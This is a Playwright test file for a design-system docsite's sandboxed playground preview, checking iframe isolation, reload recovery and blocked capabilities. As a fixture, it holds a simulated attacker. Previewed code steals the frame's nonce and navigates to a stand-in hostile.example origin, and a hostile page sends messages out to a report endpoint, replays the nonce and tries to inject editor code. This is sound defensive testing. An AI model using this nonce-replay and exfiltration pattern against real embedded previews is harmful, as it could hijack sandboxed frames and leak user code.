// Copyright (c) Meta Platforms, Inc. and affiliates.

/**
 * @file playground-preview-isolation.spec.ts
 * @input A production docsite server (see ../playwright.config.ts)
 * @output Browser proof of the playground preview's trust boundary
 * @position Chromium contract for apps/docsite/src/app/playground —
 *   previewChannel.ts, PreviewStage.tsx, PlaygroundClient.tsx, preview/page.tsx.
 *
 * jsdom can drive the connector's state machine, and the unit suite does, but
 * it cannot prove the integration those states describe: that the iframe's
 * real `load` event is wired to the connector, that a fresh document really
 * receives the current code and theme, that a sandboxed document really has
 * no reach into the parent, and that a document previewed code navigated the
 * frame to really gets nothing. Everything here is an expectation only a
 * shipping engine can observe.
 *
 * Two lifecycles are pinned:
 *
 * 1. Reload: the preview document reloads itself (what previewed code calling
 *    `location.reload()` does). The playground must recover on its own — the
 *    replacement document renders the CURRENT code with the ACTIVE theme and
 *    mode before any edit — and an edit made afterwards must render in it.
 *
 * 2. Hostile navigation: previewed code navigates the frame to another
 *    origin, carrying the nonce it read from its own URL. That document must
 *    receive no port, no code and no theme, its replayed hello must earn
 *    nothing, and the playground must tear it down and restore a trusted
 *    preview that renders the current code again.
 */

import {writeFile} from 'node:fs/promises';
import {expect, test, type Frame, type Page} from '@playwright/test';

const PREVIEW_URL_MARK = '/playground/preview#nonce=';
const HOSTILE_ORIGIN = 'https://hostile.example';

// Every wait below spans a document lifecycle: the preview loads the
// TypeScript compiler before it can render, and a recovery is a full
// teardown, navigation, handshake and render. Wide enough for a cold CI
// runner; `expect.poll` does not inherit the config's expect timeout.
const POLL = {timeout: 45_000};

/** The playground's current preview frame, if one is attached right now. */
function previewFrame(page: Page): Frame | undefined {
  return page
    .frames()
    .find(
      frame =>
        frame.parentFrame() === page.mainFrame() &&
        frame.url().includes(PREVIEW_URL_MARK),
    );
}

/** The current preview frame, which the caller has already waited for. */
function currentPreviewFrame(page: Page): Frame {
  const frame = previewFrame(page);
  if (!frame) {
    throw new Error('no preview frame is attached');
  }
  return frame;
}

/**
 * Text content of the current preview document, or null while there is none
 * or it is mid-replacement (a detached frame throws on evaluate).
 */
async function previewText(page: Page): Promise<string | null> {
  const frame = previewFrame(page);
  if (!frame) {
    return null;
  }
  try {
    return await frame.evaluate(() => document.body.innerText);
  } catch {
    return null;
  }
}

async function expectPreviewToRender(page: Page, text: string) {
  await expect
    .poll(() => previewText(page), {
      ...POLL,
      message: `preview renders "${text}"`,
    })
    .toContain(text);
}

/** The preview's `<Theme>` wrapper as the frame paints it. */
async function previewTheme(page: Page) {
  const frame = previewFrame(page);
  if (!frame) {
    return null;
  }
  try {
    return await frame.evaluate(() => {
      // The preview wraps the rendered example in its own <Theme>; the
      // docsite providers above it contribute another wrapper on the site
      // theme, so pick the one carrying the playground's theme.
      const wrappers = Array.from(
        document.querySelectorAll('div[data-astryx-theme]'),
      );
      const wrapper = wrappers[wrappers.length - 1];
      if (!wrapper) {
        return null;
      }
      const style = getComputedStyle(wrapper);
      return {
        mode: wrapper.getAttribute('data-theme'),
        bodyFont: style.getPropertyValue('--font-family-body').trim(),
      };
    });
  } catch {
    return null;
  }
}

/** Replace the editor's source; the playground debounces and ships it. */
async function setEditorCode(page: Page, code: string) {
  await expect
    .poll(
      () =>
        page.evaluate(() => {
          const monaco = (
            window as unknown as {
              monaco?: {editor: {getModels: () => Array<unknown>}};
            }
          ).monaco;
          return monaco?.editor.getModels().length ?? 0;
        }),
      POLL,
    )
    .toBeGreaterThan(0);
  await page.evaluate(source => {
    const monaco = (
      window as unknown as {
        monaco: {
          editor: {getModels: () => Array<{setValue: (v: string) => void}>};
        };
      }
    ).monaco;
    monaco.editor.getModels()[0].setValue(source);
  }, code);
}

function exampleRendering(text: string) {
  return [
    `import {Text} from '@astryxdesign/core/Text';`,
    `export default function Example() {`,
    `  return <Text>${text}</Text>;`,
    `}`,
  ].join('\n');
}

test.describe('playground preview isolation', () => {
  test('survives a deployment-injected cookie probe', async ({page}) => {
    // Vercel adds its Toolbar cookie probe to Next's shared main-app bundle.
    // Insert the same probe immediately after our bootstrap guard but before
    // the Webpack runtime, making this stricter than the deployed ordering.
    await page.route(
      /\/_next\/static\/chunks\/main-app-[^/]+\.js/,
      async route => {
        // A new connection, so a kept-alive socket that `next start` closes
        // for idleness cannot reset this fetch.
        const response = await route.fetch({
          headers: {...route.request().headers(), connection: 'close'},
        });
        const body = await response.text();
        const runtimeStart = body.indexOf('(self.webpackChunk_N_E=');
        expect(runtimeStart).toBeGreaterThan(0);
        const cookieProbe = [
          "if (location.pathname === '/playground/preview') {",
          '  void document.cookie;',
          '}',
        ].join('\n');
        await route.fulfill({
          response,
          body: [
            body.slice(0, runtimeStart),
            cookieProbe,
            body.slice(runtimeStart),
          ].join('\n'),
        });
      },
    );

    await page.goto('/playground');

    await expectPreviewToRender(page, 'Welcome');
    await expect(
      page.getByText('Build error', {exact: true}),
    ).not.toBeVisible();
    expect(
      await currentPreviewFrame(page).evaluate(() => {
        const blocked = (probe: () => unknown) => {
          try {
            probe();
            return false;
          } catch {
            return true;
          }
        };
        return {
          cookie: document.cookie,
          localStorage: blocked(() => window.localStorage),
          parentDocument: blocked(() => window.parent.document),
        };
      }),
    ).toEqual({cookie: '', localStorage: true, parentDocument: true});
  });

  test('reports a compiler bootstrap failure instead of building forever', async ({
    page,
  }) => {
    await page.route('**/vendor/typescript.js', route => route.abort());

    await page.goto('/playground');

    await expect(page.getByText('Build error', {exact: true})).toBeVisible();
    await expect(page.getByText('Building…', {exact: true})).not.toBeVisible();

    // An edit updates the pending code but preserves the actionable error. It
    // must not re-enter Building without restarting the failed document.
    await setEditorCode(page, exampleRendering('Pending retry'));
    await page.waitForTimeout(600);
    await expect(page.getByText('Build error', {exact: true})).toBeVisible();
    await expect(page.getByText('Building…', {exact: true})).not.toBeVisible();
  });

  test('allows an attested preview time to load its compiler', async ({
    page,
  }) => {
    let releaseCompiler!: () => void;
    let markCompilerRequested!: () => void;
    const compilerRequested = new Promise<void>(resolve => {
      markCompilerRequested = resolve;
    });
    const compilerGate = new Promise<void>(resolve => {
      releaseCompiler = resolve;
    });
    await page.route('**/vendor/typescript.js', async route => {
      markCompilerRequested();
      await compilerGate;
      await route.continue();
    });

    await page.goto('/playground', {waitUntil: 'domcontentloaded'});
    await compilerRequested;
    await page.waitForTimeout(12_000);
    await expect(
      page.getByText('Build error', {exact: true}),
    ).not.toBeVisible();

    releaseCompiler();
    await expectPreviewToRender(page, 'Welcome');
  });

  test('times out a preview document that never starts', async ({page}) => {
    await page.route(
      /\/_next\/static\/chunks\/app\/playground\/preview\/page-[^/]+\.js/,
      route => route.abort(),
    );

    await page.goto('/playground');

    await expect(page.getByText('Build error', {exact: true})).toBeVisible({
      timeout: 40_000,
    });
    await expect(page.getByText('Building…', {exact: true})).not.toBeVisible();
  });

  test('recovers from a reloaded preview document with the current code, theme and mode', async ({
    page,
  }) => {
    // ?theme=gothic seeds a non-default theme so "active theme" is
    // distinguishable from the default; Gothic's body face is Fustat.
    await page.goto('/playground?theme=gothic');
    await expectPreviewToRender(page, 'Welcome');

    // The production sandbox: an opaque origin with no reach into the parent
    // and no storage, which is the boundary everything below protects.
    const frame = currentPreviewFrame(page);
    expect(
      await page.locator('iframe[title="Preview"]').getAttribute('sandbox'),
    ).toBe('allow-scripts');
    expect(
      await frame.evaluate(() => {
        const blocked = (probe: () => unknown) => {
          try {
            probe();
            return false;
          } catch {
            return true;
          }
        };
        return {
          parentDocument: blocked(() => window.parent.document),
          localStorage: blocked(() => window.localStorage),
        };
      }),
    ).toEqual({parentDocument: true, localStorage: true});

    await page.getByRole('button', {name: 'Switch to dark'}).click();
    await expect
      .poll(() => previewTheme(page), POLL)
      .toMatchObject({
        mode: 'dark',
      });
    expect((await previewTheme(page))?.bodyFont).toContain('Fustat');

    // The preview document reloads itself: same URL, same spent nonce.
    const replacedUrl = frame.url();
    await frame.evaluate(() => {
      setTimeout(() => location.reload(), 0);
    });

    // The detached-frame gap must not count as recovery: `null !== old URL`
    // was true before a replacement iframe had even been attached. Wait for a
    // live frame with a new trusted nonce, then for its current content below.
    await expect
      .poll(() => {
        const nextUrl = previewFrame(page)?.url();
        return Boolean(
          nextUrl &&
          nextUrl !== replacedUrl &&
          nextUrl.includes(PREVIEW_URL_MARK),
        );
      }, POLL)
      .toBe(true);

    // … and the new document renders the current code with the active theme
    // and mode, with no edit needed to wake it up.
    await expectPreviewToRender(page, 'Welcome');
    await expect
      .poll(() => previewTheme(page), POLL)
      .toMatchObject({
        mode: 'dark',
      });
    expect((await previewTheme(page))?.bodyFont).toContain('Fustat');

    // An edit made after the reload renders in the replacement document.
    await setEditorCode(page, exampleRendering('Reloaded and edited'));
    await expectPreviewToRender(page, 'Reloaded and edited');
    await expect
      .poll(() => previewTheme(page), POLL)
      .toMatchObject({
        mode: 'dark',
      });
    expect((await previewTheme(page))?.bodyFont).toContain('Fustat');
  });

  test('gives a document that previewed code navigated the frame to nothing, then restores the preview', async ({
    page,
  }) => {
    // Everything the hostile document observes is reported out of band,
    // because the playground destroys it as soon as it finishes loading.
    const reports: URL[] = [];
    await page.route(`${HOSTILE_ORIGIN}/**`, async route => {
      const url = new URL(route.request().url());
      if (url.pathname === '/report') {
        reports.push(url);
        await route.fulfill({status: 204});
        return;
      }
      if (url.pathname === '/slow.gif') {
        // Holds the hostile document's `load` event open so it has ample
        // time to receive anything the playground might send it.
        await new Promise(resolve => setTimeout(resolve, 1500));
        await route.fulfill({status: 404});
        return;
      }
      await route.fulfill({
        status: 200,
        contentType: 'text/html',
        body: hostileDocument(url.searchParams.get('nonce') ?? ''),
      });
    });

    await page.goto('/playground');
    await expectPreviewToRender(page, 'Welcome');
    const trustedUrl = currentPreviewFrame(page).url();

    // Previewed code, running inside the trusted document with everything it
    // knows, navigates the frame to another origin and takes the nonce along.
    await setEditorCode(
      page,
      [
        `location.href = '${HOSTILE_ORIGIN}/landing?nonce=' +`,
        `  encodeURIComponent(new URLSearchParams(location.hash.slice(1)).get('nonce') ?? '');`,
        `export default function Example() { return null; }`,
      ].join('\n'),
    );

    // The hostile document did run (this is not a vacuous pass) and did
    // replay the nonce.
    await expect
      .poll(() => reports.map(r => r.searchParams.get('event')), POLL)
      .toContain('hello-replayed');

    // Once it has run, take the hostile snippet back out of the editor so the
    // restored preview does not immediately navigate away again.
    await setEditorCode(page, exampleRendering('Restored preview'));

    // The playground tears the hostile document down and restores a trusted
    // preview under a fresh nonce, which renders the current code.
    await expect
      .poll(
        () =>
          page.frames().some(frame => frame.url().startsWith(HOSTILE_ORIGIN)),
        POLL,
      )
      .toBe(false);
    await expect
      .poll(() => previewFrame(page)?.url() ?? null, POLL)
      .not.toBe(trustedUrl);
    await expectPreviewToRender(page, 'Restored preview');

    // The hostile document got nothing: no port, so no code and no theme.
    const received = reports
      .filter(r => r.searchParams.get('event') === 'received')
      .map(r => ({
        type: r.searchParams.get('type'),
        ports: r.searchParams.get('ports'),
        via: r.searchParams.get('via'),
      }));
    expect(received.filter(r => r.via === 'port')).toEqual([]);
    expect(received.filter(r => r.ports !== '0')).toEqual([]);
    expect(received.map(r => r.type)).not.toContain('astryx-preview-connect');
    expect(received.map(r => r.type)).not.toContain('preview-code');
    expect(received.map(r => r.type)).not.toContain('preview-theme');

    // And the editor still holds what the user wrote.
    expect(
      await page.evaluate(() =>
        (
          window as unknown as {
            monaco: {
              editor: {getModels: () => Array<{getValue: () => string}>};
            };
          }
        ).monaco.editor
          .getModels()[0]
          .getValue(),
      ),
    ).toContain('Restored preview');
  });
});

test.describe('restricted preview capabilities', () => {
  test('keeps targeting and property edits on the attested channel', async ({
    page,
  }, testInfo) => {
    await page.goto('/playground');
    await expectPreviewToRender(page, 'Welcome');
    await setEditorCode(
      page,
      `
      import {Button} from '@astryxdesign/core/Button';
      export default function Example() { return <Button label="Edit me" />; }
    `,
    );
    await expectPreviewToRender(page, 'Edit me');
    const frame = currentPreviewFrame(page);
    await page
      .getByRole('button', {name: 'Target element', exact: true})
      .click();
    await frame.getByRole('button', {name: 'Edit me', exact: true}).click();
    await expect(
      page.getByRole('button', {name: 'Target element', exact: true}),
    ).toHaveAttribute('aria-pressed', 'false');
    await frame.getByRole('button', {name: 'Properties', exact: true}).click();
    await frame
      .getByRole('textbox', {name: 'label', exact: true})
      .fill('Edited through properties');
    await frame.getByRole('button', {name: 'Apply', exact: true}).click();
    await expectPreviewToRender(page, 'Edited through properties');
    expect(
      await page.evaluate(() =>
        (
          window as unknown as {
            monaco: {
              editor: {getModels: () => Array<{getValue: () => string}>};
            };
          }
        ).monaco.editor
          .getModels()[0]
          .getValue(),
      ),
    ).toContain('Edited through properties');
    await page.screenshot({
      path: testInfo.outputPath('targeting-roundtrip.png'),
    });
  });

  test('keeps AI Chat usable without its saved panel width', async ({
    page,
  }, testInfo) => {
    const errors: string[] = [];
    page.on('pageerror', error => errors.push(error.message));
    await page.goto('/playground?template=ai-chat');
    await expectPreviewToRender(page, 'auth-service.ts');
    const frame = currentPreviewFrame(page);
    const input = frame.locator('[contenteditable="true"]').first();
    await input.fill('Draft stays in memory');
    await expect(input).toHaveText('Draft stays in memory');
    expect(
      await frame.evaluate(() => {
        try {
          localStorage.setItem('preview-probe', 'blocked');
          return false;
        } catch {
          return true;
        }
      }),
    ).toBe(true);
    await expect(
      page.getByText('Ephemeral preview:', {exact: false}),
    ).toBeVisible();
    await page.screenshot({path: testInfo.outputPath('ai-chat-ephemeral.png')});
    expect(errors).toEqual([]);
  });

  test('denies privileged clipboard and microphone operations while typed input works', async ({
    page,
  }, testInfo) => {
    const errors: string[] = [];
    page.on('pageerror', error => errors.push(error.message));
    await page.goto('/playground');
    await expectPreviewToRender(page, 'Welcome');
    await setEditorCode(
      page,
      `
      import {useState} from 'react';
      import {useClipboard} from '@astryxdesign/core/hooks';
      import {useChatDictation, ChatDictationButton} from '@astryxdesign/core/Chat';
      export default function Example() {
        const {copy, isCopied} = useClipboard();
        const [copyResult, setCopyResult] = useState('Copy not attempted');
        const [mic, setMic] = useState('Microphone not attempted');
        const [speechError, setSpeechError] = useState('');
        const [dictationAttempts, setDictationAttempts] = useState(0);
        const dictation = useChatDictation({onError: event => setSpeechError(event.error)});
        const observedDictation = {...dictation, toggle: () => {
          setDictationAttempts(count => count + 1);
          dictation.toggle();
        }};
        return <div>
          <p>Restricted capabilities</p>
          <textarea aria-label="Typed message" defaultValue="Selectable text" />
          <button onClick={async () => setCopyResult(await copy('Selectable text') ? 'Copied' : 'Copy unavailable')}>Try copy</button>
          <p>{copyResult}</p><p>{isCopied ? 'Copied state' : 'Not copied'}</p>
          <button onClick={async () => {
            if (!navigator.mediaDevices?.getUserMedia) {
              setMic('Microphone unavailable');
              return;
            }
            try {
              const stream = await navigator.mediaDevices.getUserMedia({audio: true});
              stream.getTracks().forEach(track => track.stop());
              setMic('Microphone allowed');
            } catch (error) { setMic('Microphone denied: ' + error.name); }
          }}>Try microphone</button>
          <p>{mic}</p>
          <p>{dictation.isSupported ? 'Dictation available' : 'Dictation unavailable'}</p>
          <ChatDictationButton dictation={observedDictation} label="Try dictation" />
          <p>Dictation attempts: {dictationAttempts}</p>
          <p>{dictation.isListening ? 'Listening' : 'Not listening'}</p>
          <p>{speechError}</p>
        </div>;
      }
    `,
    );
    await expectPreviewToRender(page, 'Restricted capabilities');
    const frame = currentPreviewFrame(page);
    const capabilities = await frame.evaluate(() => {
      const policy = (
        document as Document & {
          featurePolicy: {allowsFeature: (feature: string) => boolean};
        }
      ).featurePolicy;
      return {
        secureContext: window.isSecureContext,
        clipboard: typeof navigator.clipboard,
        getUserMedia: typeof navigator.mediaDevices?.getUserMedia,
        speechRecognition:
          'SpeechRecognition' in window || 'webkitSpeechRecognition' in window,
        microphoneAllowed: policy.allowsFeature('microphone'),
        clipboardWriteAllowed: policy.allowsFeature('clipboard-write'),
      };
    });
    await writeFile(
      testInfo.outputPath('browser-capabilities.json'),
      JSON.stringify(capabilities, null, 2),
    );
    // CI has no physical microphone, and Chromium can report NotFoundError
    // before a permission error. Pin the real policy independently so missing
    // hardware cannot make a relaxed sandbox appear to enforce the boundary.
    expect(capabilities).toMatchObject({
      microphoneAllowed: false,
      clipboardWriteAllowed: false,
    });
    await frame.getByRole('button', {name: 'Try copy', exact: true}).click();
    await expect(
      frame.getByText('Copy unavailable', {exact: true}),
    ).toBeVisible();
    await expect(frame.getByText('Not copied', {exact: true})).toBeVisible();
    await frame
      .getByRole('button', {name: 'Try microphone', exact: true})
      .click();
    await expect(
      frame.getByText(
        /^Microphone (unavailable|denied: (SecurityError|NotAllowedError|NotFoundError))$/,
      ),
    ).toBeVisible();
    if (
      await frame
        .getByRole('button', {name: 'Try dictation', exact: true})
        .count()
    ) {
      await frame
        .getByRole('button', {name: 'Try dictation', exact: true})
        .click();
      // SpeechRecognition can expose its constructor without delivering an
      // asynchronous error in headless Chromium. Prove the real hook was
      // activated, retain its observed outcome, and require usable typed input.
      // Permission policy above—not a service callback—is the denial oracle.
      await expect(
        frame.getByText('Dictation attempts: 1', {exact: true}),
      ).toBeVisible();
    } else {
      await expect(
        frame.getByText('Dictation unavailable', {exact: true}),
      ).toBeVisible();
    }
    await expect(frame.getByText('Not listening', {exact: true})).toBeVisible();
    await frame
      .getByRole('textbox', {name: 'Typed message'})
      .fill('Typing still works');
    await expect(
      frame.getByRole('textbox', {name: 'Typed message'}),
    ).toHaveValue('Typing still works');
    await writeFile(
      testInfo.outputPath('capability-outcomes.txt'),
      await frame.locator('body').innerText(),
    );
    await page.screenshot({
      path: testInfo.outputPath('restricted-capabilities.png'),
    });
    expect(errors).toEqual([]);
  });

  test('retains typed dates and user-activated file pickers without origin privileges', async ({
    page,
  }, testInfo) => {
    const errors: string[] = [];
    page.on('pageerror', error => errors.push(error.message));
    await page.goto('/playground');
    await expectPreviewToRender(page, 'Welcome');
    await setEditorCode(
      page,
      `
      import {useState, useRef} from 'react';
      import {DateInput} from '@astryxdesign/core/DateInput';
      export default function Example() {
        const [date, setDate] = useState('2026-09-23');
        const [picker, setPicker] = useState('Picker not attempted');
        const [file, setFile] = useState('No file');
        const input = useRef(null);
        return <div>
          <p>Native picker restrictions</p>
          <DateInput label="Appointment" nativePicker="always" value={date} onChange={setDate} />
          <p>Selected date: {date}</p>
          <input ref={input} type="date" aria-label="Native date probe" />
          <button onClick={() => {
            try { input.current.showPicker(); setPicker('Date picker allowed'); }
            catch (error) { setPicker('Date picker denied: ' + error.name); }
          }}>Try date picker</button>
          <p>{picker}</p>
          <input type="file" aria-label="Choose file" onChange={event => setFile(event.target.files[0]?.name ?? 'No file')} />
          <p>{file}</p>
          <input type="color" aria-label="Choose color" defaultValue="#0064e0" onClick={event => {
            try { event.currentTarget.showPicker(); setPicker('Color picker allowed'); }
            catch (error) { setPicker('Color picker denied: ' + error.name); }
          }} />
        </div>;
      }
    `,
    );
    await expectPreviewToRender(page, 'Native picker restrictions');
    const frame = currentPreviewFrame(page);
    await frame
      .getByRole('button', {name: 'Try date picker', exact: true})
      .click();
    await expect(
      frame.getByText('Date picker denied: SecurityError', {exact: true}),
    ).toBeVisible();
    await frame
      .getByRole('button', {name: 'Open calendar', exact: true})
      .click();
    const date = frame.locator('input[type="date"]').first();
    await expect(date).toBeFocused();
    await date.fill('2026-10-05');
    await date.press('Tab');
    await expect(
      frame.getByText('Selected date: 2026-10-05', {exact: true}),
    ).toBeVisible();
    const chooserEvent = page.waitForEvent('filechooser');
    await frame.getByLabel('Choose file', {exact: true}).click();
    const chooser = await chooserEvent;
    await chooser.setFiles({
      name: 'example.txt',
      mimeType: 'text/plain',
      buffer: Buffer.from('Selected by the user'),
    });
    await expect(frame.getByText('example.txt', {exact: true})).toBeVisible();
    // Color is another cross-origin showPicker exception; prove the activated
    // API call succeeds rather than mistaking a silent click for an open picker.
    await frame.getByLabel('Choose color', {exact: true}).click();
    await page.keyboard.press('Escape');
    await expect(
      frame.getByText('Color picker allowed', {exact: true}),
    ).toBeVisible();
    await page.screenshot({path: testInfo.outputPath('native-pickers.png')});
    expect(errors).toEqual([]);
  });

  test('uses native links in the opaque document and recovers from non-fragment navigation', async ({
    page,
  }, testInfo) => {
    const errors: string[] = [];
    page.on('pageerror', error => errors.push(error.message));
    let navigated = false;
    await page.route('**/preview-destination', async route => {
      navigated = true;
      await route.fulfill({
        contentType: 'text/html',
        body: '<p>Destination reached</p>',
      });
    });
    await page.goto('/playground');
    await expectPreviewToRender(page, 'Welcome');
    await setEditorCode(
      page,
      `
      import {Link} from '@astryxdesign/core/Link';
      export default function Example() {
        return <div>
          <p>Preview navigation</p>
          <Link href="#section">Jump to section</Link>
          <p id="section">Same-document section</p>
          <Link href="/preview-destination">Open destination</Link>
        </div>;
      }
    `,
    );
    await expectPreviewToRender(page, 'Preview navigation');
    const frame = currentPreviewFrame(page);
    const originalSource = await page
      .locator('iframe[title="Preview"]')
      .getAttribute('src');
    await frame
      .getByRole('link', {name: 'Jump to section', exact: true})
      .click();
    await expect.poll(() => frame.url(), POLL).toContain('#section');
    expect(frame.isDetached()).toBe(false);
    await expect(page.locator('iframe[title="Preview"]')).toHaveAttribute(
      'src',
      originalSource ?? '',
    );
    await frame
      .getByRole('link', {name: 'Open destination', exact: true})
      .click();
    await expect.poll(() => navigated, POLL).toBe(true);
    await expect.poll(() => frame.isDetached(), POLL).toBe(true);
    await expectPreviewToRender(page, 'Preview navigation');
    expect(
      await page.locator('iframe[title="Preview"]').getAttribute('src'),
    ).not.toBe(originalSource);
    await expect(page.locator('iframe[title="Preview"]')).toHaveAttribute(
      'sandbox',
      'allow-scripts',
    );
    await page.screenshot({
      path: testInfo.outputPath('navigation-restored.png'),
    });
    expect(errors).toEqual([]);
  });
});

/**
 * The page previewed code navigates the frame to. It plays the attacker the
 * reviewers described: it replays the nonce it was handed in a hello — once
 * immediately, then continuously, so a replay also lands in the window between
 * the playground discarding the old generation and React committing the new
 * iframe, while the old frame's window is still the one the playground holds —
 * adopts any port it is offered, answers `preview-ready` on it to draw out the
 * code and theme, tries to rewrite the editor, and reports every message it
 * sees.
 */
function hostileDocument(nonce: string): string {
  return `<!doctype html>
<html><head><meta charset="utf-8"></head><body>
<script>
  var report = function (params) {
    var url = new URL('${HOSTILE_ORIGIN}/report');
    Object.keys(params).forEach(function (key) {
      url.searchParams.set(key, String(params[key]));
    });
    fetch(url.toString(), {mode: 'no-cors', keepalive: true}).catch(function () {});
  };
  var describe = function (data) {
    return data && typeof data === 'object' && typeof data.type === 'string'
      ? data.type
      : typeof data;
  };
  window.addEventListener('message', function (event) {
    report({event: 'received', via: 'window', type: describe(event.data), ports: event.ports.length});
    if (event.ports.length > 0) {
      var port = event.ports[0];
      port.onmessage = function (portEvent) {
        report({event: 'received', via: 'port', type: describe(portEvent.data), ports: 0});
      };
      port.postMessage({type: 'preview-ready'});
      port.postMessage({type: 'preview-edit-code', code: 'export default () => "owned";'});
    }
  });
  var replayHello = function () {
    window.parent.postMessage({type: 'astryx-preview-hello', nonce: ${JSON.stringify(nonce)}}, '*');
  };
  report({event: 'loaded'});
  replayHello();
  report({event: 'hello-replayed'});
  setInterval(replayHello, 1);
</script>
<img src="${HOSTILE_ORIGIN}/slow.gif" alt="">
</body></html>`;
}
